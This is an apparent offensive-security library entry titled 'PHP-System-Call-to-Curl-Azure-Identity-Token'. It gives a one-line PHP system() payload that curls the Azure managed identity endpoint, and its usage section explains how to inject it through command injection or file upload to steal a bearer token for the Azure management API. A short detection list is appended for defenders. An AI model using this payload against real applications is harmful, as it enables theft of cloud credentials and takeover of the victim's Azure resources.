---
id: 154ddaa6-b6c7-42d2-8e3f-c0911c4062d5
name: PHP-System-Call-to-Curl-Azure-Identity-Token
type: code
language: PHP
verified: true
created_at: '2023-05-24T16:00:22.700404+00:00'
updated_at: '2023-05-24T16:00:22.893652+00:00'
platforms:
  - Linux
  - Web
tags:
  - php
  - token-theft
  - azure
validated: true
---

# PHP-System-Call-to-Curl-Azure-Identity-Token

## Code

```php
system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
```

## Description

This PHP code snippet uses the system() function to execute a curl command that requests an access token from the Azure Instance Metadata Service (IMDS) using Managed Identity environment variables. It targets the management.azure.com resource scope, allowing the attacker to obtain a bearer token for Azure API authentication when executed in a vulnerable web application context.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $IDENTITY_ENDPOINT | The IMDS endpoint URL for token requests | http://169.254.169.254/metadata/identity/oauth2/token |
| $IDENTITY_HEADER | The secret header value for authenticating the identity request | abc123def456 |

## Usage

Inject this code into a PHP web application via a vulnerability like command injection or file upload. Ensure the application runs on an Azure resource with Managed Identity enabled, so the environment variables are populated. The output will be the JSON response containing the access_token, which can be captured and used for further Azure API calls (e.g., via curl with Authorization: Bearer <token>).

## Detection

- Monitor web application logs for system() calls or curl executions targeting 169.254.169.254.
- Azure activity logs showing token requests from unexpected principals or IPs.
- PHP error logs indicating execution of external commands.
- Network traffic to IMDS endpoints from application servers.

## Related

- [[procedures/Azure-Managed-Identity-Token-Theft-via-Environment-Variables]]
